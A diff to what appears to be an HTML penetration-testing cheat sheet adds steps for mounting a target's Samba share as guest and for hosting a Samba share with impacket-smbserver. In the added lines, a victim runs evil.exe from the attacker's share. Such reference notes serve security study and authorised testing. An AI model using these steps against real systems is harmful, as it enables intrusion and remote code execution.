@@ -271,17 +271,20 @@ rpcclient $> exit
 
 <p id="info">Mount Samba Drive</p>
 <p id="codebox">
+    umount  /mnt/smb <br>
+    cd /mnt/smb <br>
+    mount -t cifs -o username=guest //$TARGET/$SHARE /mnt/smb  
+</p>
+
+<p id="info">Host Samba server</p>
+<p id="codebox">
     <b>Kali</b><br>
     impacket-smbserver $FOLDER_NAME `pwd`<br>
     <b>Victim</b><br>
     \\$KALI_IP\$FOLDER_NAME\evil.exe<br>
-</p>
+</p>    
 
-<p id="info">House Samba server</p>
-<p id="codebox"
-    mget *
 
-</p>
 
 
 <h2>Microsoft SQL Server - TCP/1433</h2>
